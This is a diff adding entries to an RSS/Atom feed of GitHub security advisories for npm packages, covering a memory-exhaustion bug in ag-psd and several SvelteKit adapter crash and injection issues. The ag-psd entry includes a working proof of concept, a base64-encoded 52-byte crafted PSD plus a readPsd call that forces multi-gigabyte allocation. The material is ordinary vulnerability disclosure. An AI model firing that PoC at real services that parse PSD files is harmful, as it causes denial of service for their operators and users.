@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://prajeetguha.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-11-13T19:16:22.054Z</updated>
+    <updated>2026-11-14T00:41:57.553Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,545 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[ag-psd] ag-psd can exhaust memory when parsing crafted PSD dimensions]]></title>
+        <id>https://github.com/advisories/GHSA-qfx6-q44v-9qqw</id>
+        <link href="https://github.com/advisories/GHSA-qfx6-q44v-9qqw"/>
+        <updated>2026-11-13T23:19:41.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>ag-psd</td>
+<td><code>&lt; 31.0.0</code></td>
+<td><code>31.0.0</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>readPsd() commits the image/layer buffers from the declared header geometry (width x height x channels x depth, and per-layer rectangles) before validating those values against the actual data. A tiny crafted PSD declaring huge geometry forces a multi-gigabyte allocation.</p>
+<h3 id="impact">Impact</h3>
+<p>On ag-psd 30.2.0, Node 24, a 52-byte PSD makes readPsd(buf) commit ~3.17 GB (measured peak RSS) in ~0.45 s before throwing a catchable RangeError ("Offset is outside the bounds of the DataView") — about 61,000,000x amplification. Because the buffer is committed before validation, the allocation OOM-kills the process before the error on essentially any host (uncatchable), and concurrent requests exhaust memory. Any service reading untrusted PSDs with ag-psd is exposed to a remote DoS.</p>
+<p>This is distinct from #39 and #206, which involve genuinely large PSDs (memory proportional to real data). Here the input is 52 bytes: the file declares enormous geometry that is never present, so the allocation is driven by an unvalidated header field, not by actual content, an uncontrolled-allocation denial-of-service vulnerability, not proportional memory use.</p>
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+<p>The PoC is a 52-byte PSD (sha256 a1146a6fabdfef289472f99a56851249e7a46e8d19d4d8bf85fe833e2f0158b6). Reconstruct with:</p>
+<pre><code>base64 -d &gt; poc.psd &lt;&lt;'EOF'
+OEJQUwABAAAAAAAAAA0AADcuAAA58wAgAAMAAAAAAAAAAAAAAAAAAdEgNZv+i9bc9ygd2A==
+EOF
+</code></pre>
+<p>Then (commits ~3.17 GB before throwing a catchable RangeError):</p>
+<pre><code>const { readPsd } = require('ag-psd');
+const buf = require('fs').readFileSync('poc.psd');
+readPsd(buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength));
+</code></pre>
+<h3 id="root-cause">Root cause</h3>
+<p>psdReader.js sizes the off-heap typed-array buffers from the declared header dimensions (and per-layer rectangles, a second independent lever) before validating against the available bytes.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Validate the declared dimensions, channel count, depth, and per-layer rectangles against the actual input length (and a sane maximum) before allocating.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Agamnentzar/ag-psd/security/advisories/GHSA-qfx6-q44v-9qqw">https://github.com/Agamnentzar/ag-psd/security/advisories/GHSA-qfx6-q44v-9qqw</a></li>
+<li><a href="https://github.com/Agamnentzar/ag-psd/commit/2d7da68400990bae8ba248a065eb45021fa8000a">https://github.com/Agamnentzar/ag-psd/commit/2d7da68400990bae8ba248a065eb45021fa8000a</a></li>
+<li><a href="https://github.com/Agamnentzar/ag-psd/blob/2d7da68400990bae8ba248a065eb45021fa8000a/CHANGELOG.md">https://github.com/Agamnentzar/ag-psd/blob/2d7da68400990bae8ba248a065eb45021fa8000a/CHANGELOG.md</a></li>
+<li><a href="https://github.com/Agamnentzar/ag-psd/tree/31.0.0">https://github.com/Agamnentzar/ag-psd/tree/31.0.0</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2026-62297">https://nvd.nist.gov/vuln/detail/cve-2026-62297</a></li>
+<li><a href="https://github.com/advisories/GHSA-qfx6-q44v-9qqw">https://github.com/advisories/GHSA-qfx6-q44v-9qqw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qfx6-q44v-9qqw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-13T23:19:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/kit] SvelteKit: adapter-node crashes with an unhandled URIError when `reroute` rewrites malformed pathnames]]></title>
+        <id>https://github.com/advisories/GHSA-mw6w-2fmv-pvw3</id>
+        <link href="https://github.com/advisories/GHSA-mw6w-2fmv-pvw3"/>
+        <updated>2026-11-13T20:51:48.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/kit</td>
+<td><code>&lt; 2.70.4</code></td>
+<td><code>2.70.4</code></td>
+</tr>
+</tbody>
+</table>
+<p>When <code>reroute</code> turned an invalid percent-encoded path into a valid path, it could potentially trigger a comparison that would crash the server.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-mw6w-2fmv-pvw3">https://github.com/sveltejs/kit/security/advisories/GHSA-mw6w-2fmv-pvw3</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/7993d5ebab017cb1be898a0b1c57371c5da06557">https://github.com/sveltejs/kit/commit/7993d5ebab017cb1be898a0b1c57371c5da06557</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@2.70.4">https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@2.70.4</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@3.1.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@3.1.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-mw6w-2fmv-pvw3">https://github.com/advisories/GHSA-mw6w-2fmv-pvw3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mw6w-2fmv-pvw3</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:51:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/kit] SvelteKit: adapter-node crashes with an unhandled URIError when `reroute` rewrites malformed pathnames]]></title>
+        <id>https://github.com/advisories/GHSA-mw6w-2fmv-pvw3</id>
+        <link href="https://github.com/advisories/GHSA-mw6w-2fmv-pvw3"/>
+        <updated>2026-11-13T20:51:48.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/kit</td>
+<td><code>&gt;= 3.0.0, &lt; 3.1.1</code></td>
+<td><code>3.1.1</code></td>
+</tr>
+</tbody>
+</table>
+<p>When <code>reroute</code> turned an invalid percent-encoded path into a valid path, it could potentially trigger a comparison that would crash the server.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-mw6w-2fmv-pvw3">https://github.com/sveltejs/kit/security/advisories/GHSA-mw6w-2fmv-pvw3</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/7993d5ebab017cb1be898a0b1c57371c5da06557">https://github.com/sveltejs/kit/commit/7993d5ebab017cb1be898a0b1c57371c5da06557</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@2.70.4">https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@2.70.4</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@3.1.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@3.1.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-mw6w-2fmv-pvw3">https://github.com/advisories/GHSA-mw6w-2fmv-pvw3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mw6w-2fmv-pvw3</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:51:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-static] SvelteKit: Prerendered paths are interpreted as regular expressions in Vercel route config generated by @sveltejs/adapter-vercel and @sveltejs/adapter-static]]></title>
+        <id>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</id>
+        <link href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w"/>
+        <updated>2026-11-13T20:43:24.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-static</td>
+<td><code>&lt; 3.0.11</code></td>
+<td><code>3.0.11</code></td>
+</tr>
+</tbody>
+</table>
+<p>If an attacker could influence a link that was crawled during the prerender phase, that link could later be interpreted as a regex in the Vercel routing configuration.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0">https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:43:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-vercel] SvelteKit: Prerendered paths are interpreted as regular expressions in Vercel route config generated by @sveltejs/adapter-vercel and @sveltejs/adapter-static]]></title>
+        <id>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</id>
+        <link href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w"/>
+        <updated>2026-11-13T20:43:24.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-vercel</td>
+<td><code>&gt;= 7.0.0-next.0, &lt; 7.0.2</code></td>
+<td><code>7.0.2</code></td>
+</tr>
+</tbody>
+</table>
+<p>If an attacker could influence a link that was crawled during the prerender phase, that link could later be interpreted as a regex in the Vercel routing configuration.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0">https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:43:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-static] SvelteKit: Prerendered paths are interpreted as regular expressions in Vercel route config generated by @sveltejs/adapter-vercel and @sveltejs/adapter-static]]></title>
+        <id>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</id>
+        <link href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w"/>
+        <updated>2026-11-13T20:43:24.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-static</td>
+<td><code>&gt;= 4.0.0-next.0, &lt; 4.0.1</code></td>
+<td><code>4.0.1</code></td>
+</tr>
+</tbody>
+</table>
+<p>If an attacker could influence a link that was crawled during the prerender phase, that link could later be interpreted as a regex in the Vercel routing configuration.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0">https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:43:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-vercel] SvelteKit: Prerendered paths are interpreted as regular expressions in Vercel route config generated by @sveltejs/adapter-vercel and @sveltejs/adapter-static]]></title>
+        <id>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</id>
+        <link href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w"/>
+        <updated>2026-11-13T20:43:24.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-vercel</td>
+<td><code>&lt; 6.3.5</code></td>
+<td><code>6.3.5</code></td>
+</tr>
+</tbody>
+</table>
+<p>If an attacker could influence a link that was crawled during the prerender phase, that link could later be interpreted as a regex in the Vercel routing configuration.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0">https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@4.0.1</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@6.3.5</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-vercel@7.0.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-jf9x-2fg2-hx4w">https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jf9x-2fg2-hx4w</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:43:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-cloudflare] SvelteKit: Prerendered redirect paths can inject arbitrary rules into the `_redirects` file generated by `@sveltejs/adapter-cloudflare`]]></title>
+        <id>https://github.com/advisories/GHSA-5wg4-q3ww-283h</id>
+        <link href="https://github.com/advisories/GHSA-5wg4-q3ww-283h"/>
+        <updated>2026-11-13T20:39:17.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-cloudflare</td>
+<td><code>&gt;= 8.0.0-next.0, &lt; 8.0.2</code></td>
+<td><code>8.0.2</code></td>
+</tr>
+</tbody>
+</table>
+<p>If an attacker can influence the links crawled during prerendering, they can influence the redirects entries that are added to the Cloudflare platform redirects generated during the adapt phase of the build.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-5wg4-q3ww-283h">https://github.com/sveltejs/kit/security/advisories/GHSA-5wg4-q3ww-283h</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/679e0d84ea9951bb4f1e458a599066b5a451b08a">https://github.com/sveltejs/kit/commit/679e0d84ea9951bb4f1e458a599066b5a451b08a</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@7.2.10">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@7.2.10</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@8.0.2">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@8.0.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-5wg4-q3ww-283h">https://github.com/advisories/GHSA-5wg4-q3ww-283h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5wg4-q3ww-283h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:39:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-cloudflare] SvelteKit: Prerendered redirect paths can inject arbitrary rules into the `_redirects` file generated by `@sveltejs/adapter-cloudflare`]]></title>
+        <id>https://github.com/advisories/GHSA-5wg4-q3ww-283h</id>
+        <link href="https://github.com/advisories/GHSA-5wg4-q3ww-283h"/>
+        <updated>2026-11-13T20:39:17.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-cloudflare</td>
+<td><code>&gt;= 4.7.0, &lt; 7.2.10</code></td>
+<td><code>7.2.10</code></td>
+</tr>
+</tbody>
+</table>
+<p>If an attacker can influence the links crawled during prerendering, they can influence the redirects entries that are added to the Cloudflare platform redirects generated during the adapt phase of the build.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-5wg4-q3ww-283h">https://github.com/sveltejs/kit/security/advisories/GHSA-5wg4-q3ww-283h</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/679e0d84ea9951bb4f1e458a599066b5a451b08a">https://github.com/sveltejs/kit/commit/679e0d84ea9951bb4f1e458a599066b5a451b08a</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@7.2.10">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@7.2.10</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@8.0.2">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@8.0.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-5wg4-q3ww-283h">https://github.com/advisories/GHSA-5wg4-q3ww-283h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5wg4-q3ww-283h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:39:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-node] SvelteKit: `@sveltejs/adapter-node` crashes when proxying certain requests via `fetch`]]></title>
+        <id>https://github.com/advisories/GHSA-rqw3-x7hx-mm3p</id>
+        <link href="https://github.com/advisories/GHSA-rqw3-x7hx-mm3p"/>
+        <updated>2026-11-13T20:38:14.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-node</td>
+<td><code>&gt;= 6.0.0-next.0, &lt; 6.0.1</code></td>
+<td><code>6.0.1</code></td>
+</tr>
+</tbody>
+</table>
+<p>In affected versions, <code>@sveltejs/adapter-node</code> can attempt to add a header to an immutable request in a context that causes the server to crash, denying service to any other requests routed to that server.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-rqw3-x7hx-mm3p">https://github.com/sveltejs/kit/security/advisories/GHSA-rqw3-x7hx-mm3p</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/04756a1f7a4f73e34f1934895340a46de84fc164">https://github.com/sveltejs/kit/commit/04756a1f7a4f73e34f1934895340a46de84fc164</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@5.5.8">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@5.5.8</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@6.0.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@6.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-rqw3-x7hx-mm3p">https://github.com/advisories/GHSA-rqw3-x7hx-mm3p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rqw3-x7hx-mm3p</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:36:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@sveltejs/adapter-node] SvelteKit: `@sveltejs/adapter-node` crashes when proxying certain requests via `fetch`]]></title>
+        <id>https://github.com/advisories/GHSA-rqw3-x7hx-mm3p</id>
+        <link href="https://github.com/advisories/GHSA-rqw3-x7hx-mm3p"/>
+        <updated>2026-11-13T20:38:14.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@sveltejs/adapter-node</td>
+<td><code>&gt;= 5.5.7, &lt; 5.5.8</code></td>
+<td><code>5.5.8</code></td>
+</tr>
+</tbody>
+</table>
+<p>In affected versions, <code>@sveltejs/adapter-node</code> can attempt to add a header to an immutable request in a context that causes the server to crash, denying service to any other requests routed to that server.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-rqw3-x7hx-mm3p">https://github.com/sveltejs/kit/security/advisories/GHSA-rqw3-x7hx-mm3p</a></li>
+<li><a href="https://github.com/sveltejs/kit/pull/17620">https://github.com/sveltejs/kit/pull/17620</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/04756a1f7a4f73e34f1934895340a46de84fc164">https://github.com/sveltejs/kit/commit/04756a1f7a4f73e34f1934895340a46de84fc164</a></li>
+<li><a href="https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd">https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd</a></li>
